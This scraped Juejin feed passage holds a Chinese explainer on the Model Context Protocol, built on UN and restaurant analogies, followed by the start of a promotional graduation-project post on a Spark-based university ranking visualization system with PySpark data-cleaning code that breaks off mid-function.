7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近半年，AI Agent 的概念火得一塌糊涂。从业内大厂到创业新贵，大家都在埋头搞自己的智能体，仿佛谁不聊 Agent 谁就落伍了。</p>
<p>但在这片繁荣之下，一个巨大的隐患正在浮现。不知道大家有没有发现，这些聪明的 AI Agent 们，其实都活在一个个孤岛上。你家的 Agent 和我家的 Agent 语言不通，A 应用的 AI 无法调用 B 应用的能力。我们亲手构建了一座“AI 巴别塔”，每个 AI 都很强大，但它们之间无法协作，形成不了合力。</p>
<p>每次想让两个 AI “聊聊”，工程师们就得吭哧吭哧地写一堆定制化的接口代码，过程堪比“跨服聊天”，极其痛苦。这就是业内常说的“接口地狱”。</p>
<p>那么，问题出在哪？是我们缺更聪明的 AI 吗？</p>
<p>不是。<strong>我们缺的不是更强的个体，而是一套所有 AI 都能听懂、都会遵守的“普通话”。</strong></p>
<p>今天，我们就来聊聊这个破局的关键——MCP（Model Context Protocol，模型上下文协议）。</p>
<h3 data-id="heading-0">MCP 是什么？把它想象成 AI 界的“联合国同声传译”</h3>
<p>想理解 MCP，千万别去看那些复杂的 JSON 代码，那会把人绕进去。</p>
<p>我们换个场景：把它想象成一个“AI 联合国”。</p>
<p>全世界的 AI Agent 们（代表）要开个会，讨论如何协同工作。但它们来自不同的“国家”（由不同公司或开发者创造），说着五花八门的“方言”（私有 API）。直接开会，必然是鸡同鸭讲。</p>
<p>怎么办？联合国（MCP）站了出来，提供了两样核心服务：</p>
<p><strong>1. 一套标准化的“外交礼仪”</strong></p>
<p>在会议开始前，每位代表入场时，都必须先出示自己的“身份牌”，上面写着自己的身份、以及被授权可以讨论哪些议题。比如，A 代表说：“我是数据分析 AI，我可以聊‘数据查询’和‘图表生成’。” B 代表说：“我是代码助手 AI，我可以聊‘代码生成’和‘bug 修复’。”</p>
<p><img src="https://cdn.gooo.ai/web-images/db4507d4f7e691e28b5bd86db7480455cdeb896dad2f7ec71ff3949f5d12a27c" alt="图 1: MCP 消息交互流程" loading="lazy"/></p>
<p>这个“亮牌”的过程，在 MCP里就叫 <code>initialize</code>（初始化）和 <code>capabilities</code>（能力协商）。<strong>这套“先小人后君子”的规则，确保了双方从一开始就知道对方的底细，避免了无效沟通和“画大饼”。</strong></p>
<p><strong>2. 一套极简的“对话格式”</strong></p>
<p>明确了身份和能力后，代表们就可以开始沟通了。MCP 规定，所有的对话都必须遵循三种格式，我们可以用一个更接地气的比喻——“餐厅后厨系统”来理解：</p>
<p><img src="https://cdn.gooo.ai/gen-images/8f6d10c11b3032a9abdc9c110ad13c7945d7a1e91b0755fa19f2eee321654e6a.png" alt="MCP Restaurant Analogy" loading="lazy"/></p>
<ul>
<li>
<p><strong>请求（Request）</strong>：就像服务员给后厨下的订单。上面有明确的桌号（<code>id</code>），以及要做的菜（<code>method</code> 和 <code>params</code>）。后厨必须对这个订单做出响应。</p>
</li>
<li>
<p><strong>响应（Response）</strong>：后厨把菜做好了，端出来，并明确告知这是哪个桌号（<code>id</code>）点的菜。这就是对“请求”的回复。</p>
</li>
<li>
<p><strong>通知（Notification）</strong>：这好比后厨上方那个实时滚动的电子屏，上面显示着“3号桌的菜正在准备中”。它只是一个单向的状态告知，服务员看到了就行，不需要回复“收到”。</p>
</li>
</ul>
<p>看，就这么简单。<strong>MCP 的本质，就是一套让 AI 之间沟通时必须遵守的、清晰且高效的“沟通礼仪”和“标准格式”。</strong> 它不关心你具体聊什么（是调用工具还是生成代码），它只关心你“应该怎么聊”。</p>
<h3 data-id="heading-1">Why it matters？为什么说它至关重要？</h3>
<p>讲到这里，你可能会觉得，这不就是个技术协议嘛，有那么重要吗？</p>
<p>问得好。一个东西的价值，要放在更大的图景里看。MCP 的重要性，体现在三个层面：</p>
<p><strong>第一层：对业务来说，是从“手工作坊”到“工业化生产”的跨越。</strong></p>
<p>在没有 MCP 的世界里，每集成一个新 AI，就像是请一位手艺人定制一件家具，成本高、周期长、还容易出错。而有了 MCP 这个统一标准，不同的 AI Agent 就像是标准化的“乐高积木”。</p>
<p><img src="https://cdn.gooo.ai/gen-images/53604954a437adf745dbc61bc842b283f88d4549f5418b409a9bf483a26ceabe.png" alt="MCP Lego Blocks" loading="lazy"/></p>
<p><strong>业务方需要一个功能时，不再需要从零开发，而是像搭乐高一样，把具备相应能力的 AI Agent 即插即用地组合起来。</strong> 这带来的将是研发效率的指数级提升和成本的大幅下降。对于追求降本增效的企业来说，这简直是福音。</p>
<p><strong>第二层：对行业来说，是从“单兵作战”到“军团协同”的进化。</strong></p>
<p>大家必须认识到一个现实：<strong>未来真正解决复杂商业问题的，不会是某一个无所不能的“超级 AI”，而是一个由多个“专才 AI”组成的协作军团。</strong></p>
<p>想象一下这个场景：一个懂营销的 AI Agent 发现了新的市场趋势，它立刻通过 MCP 调用一个懂数据的 AI Agent 去拉取并分析报告，接着又调用一个懂写作的 AI Agent 生成营销文案，最后再通知一个懂投放的 AI Agent 去执行广告投放。</p>
<p><img src="https://cdn.gooo.ai/gen-images/95841b80fbaf90e826f7e5b2504e0b9ee8809b890b46bdab5dd1697e36d2e2c7.png" alt="AI Agent Team" loading="lazy"/></p>
<p>这就是“Multi-Agent 系统”的威力。而 MCP，正是指挥这个 AI 军团协同作战的“通用语”和“指挥系统”。<strong>这是 AI 从“玩具”走向“生产力工具”的关键一步。</strong></p>
<p><strong>第三层：对未来来说，这是在抢占下一代 AI 生态的“操作系统”入口。</strong></p>
<p>回顾互联网历史，真正奠定今天网络世界基石的，不是某个杀手级应用，而是像 TCP/IP 这样的底层通信协议。它本身不创造内容，但它定义了所有信息流动的规则。</p>
<p>MCP 扮演的正是同样的角色。<strong>它在为未来亿万 AI Agent 的互联互通，铺设最底层的“高速公路”。</strong> 在这个新大陆上，谁掌握了标准，谁就能构建最繁荣的生态，吸引最多的开发者。这背后是巨大的战略价值。</p>
<p><strong>得标准者，得生态。</strong></p>
<h3 data-id="heading-2">写在最后</h3>
<p>业内有句话，一流的公司做标准。</p>
<p>当所有人的目光都还聚焦在“卷模型”、“卷参数”的时候，一些更聪明的玩家，已经开始悄悄布局更底层的“游戏规则”了。</p>
<p>MCP 协议，就是这样一场关于规则的竞赛。它不生产一个具体的 AI 功能，但它赋能了所有 AI 功能的组合与涌现。它像一套语法，让无数独立的单词（AI Agent）得以组成华美的篇章（复杂的应用）。</p>
<p>请记住：<strong>当大模型的“智商”逐渐趋同，如何构建高效的“情商”（协作能力）将成为新的分水岭。MCP，就是这场情商竞赛的起跑线。</strong></p>
<p>如果你还没关注它，现在是时候了。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【python大数据毕设实战】全球大学排名数据可视化分析系统、Hadoop、计算机毕业设计、包括数据爬取、数据分析、数据可视化、机器学习、实战教学]]></title>    <link>https://juejin.cn/post/7580287891273367615</link>    <guid>https://juejin.cn/post/7580287891273367615</guid>    <pubDate>2025-12-06T13:20:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580287891273367615" data-draft-id="7580287891273351231" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【python大数据毕设实战】全球大学排名数据可视化分析系统、Hadoop、计算机毕业设计、包括数据爬取、数据分析、数据可视化、机器学习、实战教学"/> <meta itemprop="keywords" content="后端,Python,MySQL"/> <meta itemprop="datePublished" content="2025-12-06T13:20:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="计算机毕设匠心工作室"/> <meta itemprop="url" content="https://juejin.cn/user/2452372492400835"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【python大数据毕设实战】全球大学排名数据可视化分析系统、Hadoop、计算机毕业设计、包括数据爬取、数据分析、数据可视化、机器学习、实战教学
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2452372492400835/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    计算机毕设匠心工作室
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T13:20:10.000Z" title="Sat Dec 06 2025 13:20:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>🍊作者：计算机毕设匠心工作室</p>
<p>🍊简介：毕业后就一直专业从事计算机软件程序开发，至今也有8年工作经验。擅长Java、Python、微信小程序、安卓、大数据、PHP、.NET|C#、Golang等。</p>
<p>擅长：按照需求定制化开发项目、 源码、对代码进行完整讲解、文档撰写、ppt制作。</p>
<p>🍊心愿：点赞 👍 收藏 ⭐评论 📝</p>
<p>👇🏻 精彩专栏推荐订阅 👇🏻 不然下次找不到哟~</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2401_86677951%2Fcategory_12754938.html" target="_blank" title="https://blog.csdn.net/2401_86677951/category_12754938.html" ref="nofollow noopener noreferrer">Java实战项目</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2401_86677951%2Fcategory_12754940.html" target="_blank" title="https://blog.csdn.net/2401_86677951/category_12754940.html" ref="nofollow noopener noreferrer">Python实战项目</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2401_86677951%2Fcategory_12754945.html" target="_blank" title="https://blog.csdn.net/2401_86677951/category_12754945.html" ref="nofollow noopener noreferrer">微信小程序|安卓实战项目</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2401_86677951%2Fcategory_12754947.html" target="_blank" title="https://blog.csdn.net/2401_86677951/category_12754947.html" ref="nofollow noopener noreferrer">大数据实战项目</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2401_86677951%2Fcategory_12754949.html" target="_blank" title="https://blog.csdn.net/2401_86677951/category_12754949.html" ref="nofollow noopener noreferrer">PHP|C#.NET|Golang实战项目</a></p>
<p>🍅 ↓↓文末获取源码联系↓↓🍅</p>
</blockquote>
<h2 data-id="heading-0">基于大数据的全球大学排名数据可视化分析系统-功能介绍</h2>
<p>本系统“【python大数据毕设实战】全球大学排名数据可视化分析系统”是一个专注于全球高等教育领域的综合性数据分析平台，旨在将复杂的世界大学排名数据转化为直观、易懂的可视化图表和深度洞察。系统核心构建于Python技术栈，并深度融合了大数据处理框架Hadoop与Spark，以应对海量数据带来的存储与计算挑战。后端采用轻量而强大的Django框架，负责业务逻辑处理与数据接口提供，前端则利用Vue的组件化开发思想和Echarts丰富的图表库，为用户打造一个交互流畅、视觉美观的操作界面。系统的工作流程始于对全球大学排名原始数据的获取，随后利用Spark的分布式计算能力进行高效的数据清洗、预处理与整合，确保了分析结果的准确性与可靠性。在此基础上，系统设计了多维度的数据分析模型，不仅涵盖了传统的排名查询、国家/地区实力对比等宏观分析，还深入到教学、研究、产业收入等多个核心指标的相关性探究，并创新性地引入了K-Means聚类算法，对大学进行科学分群与画像。最终，所有分析结果都通过API接口传递至前端，以动态地图、柱状图、雷达图、散点图等多种形式生动展现，为用户提供了一个全面、动态、且数据驱动的全球高等教育格局观察窗口。</p>
<h2 data-id="heading-1">基于大数据的全球大学排名数据可视化分析系统-选题背景意义</h2>
<p>选题背景
在当今全球化的时代，高等教育的选择已成为学生、学者乃至政策制定者面临的一个关键决策点。各类世界大学排名，如泰晤士高等教育世界大学排名、QS世界大学排名等，已成为衡量大学综合实力和国际声誉的重要参考依据。然而，这些排名机构发布的原始数据往往只是庞大的表格，对于普通用户而言，很难从中获得超越简单排名的深入见解。传统的分析方法，例如使用电子表格软件，在处理和分析如此大规模、多指标的数据集时显得效率低下，并且难以执行复杂的多变量关联性分析。用户迫切需要一个更强大、更智能的工具来挖掘这些数据背后的价值。随着大数据技术的飞速发展，我们有能力对这类海量信息进行更深层次的探索和处理。因此，本课题应运而生，旨在利用先进的大数据技术，对全球大学排名数据进行系统性的整合、分析与可视化，从而揭示隐藏在数字背后的教育发展规律与模式，为用户提供一个更丰富、更立体的大学排名解读视角。
选题意义
本课题的实际意义在于，它为所有关注全球高等教育发展的人群提供了一个直观且强大的数据探索工具。对于即将面临升学选择的学生和家长来说，他们不再局限于查看一个单一的、模糊的综合排名，而是可以自由地从不同维度进行筛选和对比，比如查看哪个国家在“研究质量”上表现突出，或者比较心仪几所大学在“国际化”水平和“产业收入”上的具体差异，这帮助他们做出更符合个人需求和职业规划的判断。从技术实现的角度来看，这个项目完整地展示了如何运用现代数据科学技术解决一个特定领域的实际问题。它具体实践了从数据采集、清洗、存储，到利用Spark进行分布式计算与分析，再到最终通过Web技术进行结果呈现的全过程，特别是系统中的聚类分析功能，它超越了简单的排名，尝试根据大学的多维特征对其进行科学分类，为理解不同大学的办学特色和发展模式提供了新的思路。总的来说，这个毕业设计不仅是一个功能性的应用程序，也是一次关于如何将大数据技术应用于教育数据分析领域的有益实践，其成果对于计算机专业的学生完成毕业设计，以及教育领域的研究者进行数据探索都具有较好的参考价值。</p>
<h2 data-id="heading-2">基于大数据的全球大学排名数据可视化分析系统-技术选型</h2>
<p>大数据框架：Hadoop+Spark（本次没用Hive，支持定制）
开发语言：Python+Java（两个版本都支持）
后端框架：Django+Spring Boot(Spring+SpringMVC+Mybatis)（两个版本都支持）
前端：Vue+ElementUI+Echarts+HTML+CSS+JavaScript+jQuery
详细技术点：Hadoop、HDFS、Spark、Spark SQL、Pandas、NumPy
数据库：MySQL</p>
<h2 data-id="heading-3">基于大数据的全球大学排名数据可视化分析系统-视频展示</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1wY2XBeEV7%2F%3Fspm_id_from%3D333.1387.homepage.video_card.click" target="_blank" title="https://www.bilibili.com/video/BV1wY2XBeEV7/?spm_id_from=333.1387.homepage.video_card.click" ref="nofollow noopener noreferrer">基于大数据的全球大学排名数据可视化分析系统-视频展示</a></p>
<h2 data-id="heading-4">基于大数据的全球大学排名数据可视化分析系统-图片展示</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5b953ca7f853455ead21c94eee9bca11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V6K6-5Yyg5b-D5bel5L2c5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765632010&amp;x-signature=PgvPDEEMKZVUym6KxAWfY09Q0Es%3D" alt="在这里插入图片描述" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/227b9bfb8f07498da2a9efac5765d128~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V6K6-5Yyg5b-D5bel5L2c5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765632010&amp;x-signature=cd%2Fn%2FdDLwNnhfEI5lqk%2F0DfIzvg%3D" alt="在这里插入图片描述" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1a8721ba96504b1ca3ca9cda5e3f0d4e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V6K6-5Yyg5b-D5bel5L2c5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765632010&amp;x-signature=9DihVFz5edKXTxoa3GTdaifC5o8%3D" alt="在这里插入图片描述" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1744182a47a34368a03b08e7cb96decf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V6K6-5Yyg5b-D5bel5L2c5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765632010&amp;x-signature=28Wh%2BVv%2Fkbkz4McxsI%2FckJlVCYk%3D" alt="在这里插入图片描述" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1faab9b4439f4daaa78641946f39f0df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V6K6-5Yyg5b-D5bel5L2c5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765632010&amp;x-signature=CECH0f9f3ToEKz4wC9fmyZm4Xiw%3D" alt="在这里插入图片描述" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d977591fecb74295852e1751eff19d1d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V6K6-5Yyg5b-D5bel5L2c5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765632010&amp;x-signature=vSrko4pTwh20xuV%2BDwQt%2BxCiaho%3D" alt="在这里插入图片描述" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e62bdf9d64b4a909014884da4c9a1a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V6K6-5Yyg5b-D5bel5L2c5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765632010&amp;x-signature=bPSQ3bHppVFg6PLqXvCVapM%2F8XM%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h2 data-id="heading-5">基于大数据的全球大学排名数据可视化分析系统-代码展示</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> pyspark.sql <span class="hljs-keyword">import</span> SparkSession, functions <span class="hljs-keyword">as</span> F
<span class="hljs-keyword">from</span> pyspark.ml.feature <span class="hljs-keyword">import</span> VectorAssembler, StandardScaler, KMeans
<span class="hljs-keyword">from</span> pyspark.ml <span class="hljs-keyword">import</span> Pipeline

<span class="hljs-comment"># 初始化SparkSession，这是所有Spark功能的入口点</span>
spark = SparkSession.builder \
    .appName(<span class="hljs-string">"UniversityRankingAnalysis"</span>) \
    .getOrCreate()

<span class="hljs-comment"># 功能一：数据清洗与预处理 (使用Spark SQL和DataFrame API)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">clean_and_preprocess_data</span>(<span class="hljs-params">df</span>):
    <span class="hljs-comment"># 将数值列的空值填充为0</span>
    numeric_cols = [field.name <span class="hljs-keyword">for</span> field <span class="hljs-keyword">in</span> df.schema.fields <span class="hljs-keyword">if</span> field.dataType.typeName() <span class="hljs-keyword">in</span> [<span class="hljs-string">'double'</span>, <span class="hljs-string">'integer'</span>, <span class="hljs-string">'float'</span>]]
    df_filled_numeric = df.fillna(<span class="hljs-number">0</span>, subset=numeric_cols)
    <span class="hljs-comment"># 将文本列的空值填充为“未知”</span>
    df_filled_all = df_filled_numeric.fillna(<span class="hljs-string">"未知"</span>, subset=[<span class="hljs-string">"Location"</span>])
    <span class="hljs-comment"># 使用F.round函数将所有得分列格式化为两位小数</span>
    <span class="hljs-keyword">for</span> col_name <span class="hljs-keyword">in</span> [<span class="hljs-string">'Overall Teaching Score'</span>, <span class="hljs-string">'Research Score'</span>, <span class="hljs-string">'Research Quality'</span>, <span class="hljs-string">'Industry Income Score'</span>, <span class="hljs-string">'International Outlook Score'</span>, <span class="hljs-string">'Overall Score'</span>]:
        df_filled_all = df_filled_all.withColumn(col_name, F.<span class="hljs-built_in">round</span>(df_filled_all[col_name], <span class="hljs-number">2</span>))
    <span class="hljs-comment"># 创建一个映射字典来翻译国家名称</span>
    country_mapping = {<span class="hljs-string">"United States"</span>: <span class="hljs-string">"美国"</span>, <span class="hljs-string">"United Kingdom"</span>: <span class="hljs-string">"英国"</span>, <span class="hljs-string">"China"</span>: <span class="hljs-string">"中国"</span>}
    <span class="hljs-comment"># 使用F.when和F.otherwise创建一个新的翻译后的列，并替换原列</span>
    df_translated = df_filled_all.withColumn(<span class="hljs-string">"Location"</span>, F.when(df_filled_all[<span class="hljs-string">"Location"</span>].isin(country_mapping.keys()), F.create_map([F.lit(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">sum</span>(country_mapping.items(), ())]).getItem(df_filled_all[<span class="hljs-string">"Location"</span>])).otherwise(df_filled_all[<span class="hljs-string">"Location"</span>]))
    <span class="hljs-comment"># 删除完全重复的行</span>
    df_cleaned = df_translated.dropDuplicates()
    <span class="hljs-keyword">return</span> df_cleaned

<span class="hljs-comment"># 功能二：多维度分析 - 按国家/地区统计大学实力</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">analyze_university_strength_by_country</span>(<span class="hljs-params">cleaned_df</span>):
    <span class="hljs-comment"># 1. 计算每个国家上榜大学的总数</span>
    university_count_df = cleaned_df.groupBy(<span class="hljs-string">"Location"</span>).agg(F.count(<span class="hljs-string">"University"</span>).alias(<span class="hljs-string">"university_count"</span>))
    <span class="hljs-comment"># 2. 筛选出TOP100的大学，并按国家进行分组计数</span>
    top_100_df = cleaned_df.<span class="hljs-built_in">filter</span>(F.col(<span class="hljs-string">"Rank"</span>) &lt;= <span class="hljs-number">100</span>)
    top_100_count_df = top_100_df.groupBy(<span class="hljs-string">"Location"</span>).agg(F.count(<span class="hljs-string">"University"</span>).alias(<span class="hljs-string">"top_100_count"</span>))
    <span class="hljs-comment"># 3. 计算每个国家上榜大学的平均综合得分</span>
    average_score_df = cleaned_df.groupBy(<span class="hljs-string">"Location"</span>).agg(F.avg(<span class="hljs-string">"Overall Score"</span>).alias(<span class="hljs-string">"average_score"</span>))
    <span class="hljs-comment"># 4. 将以上三个分析结果通过国家名称进行关联，得到一个全面的实力分析表</span>
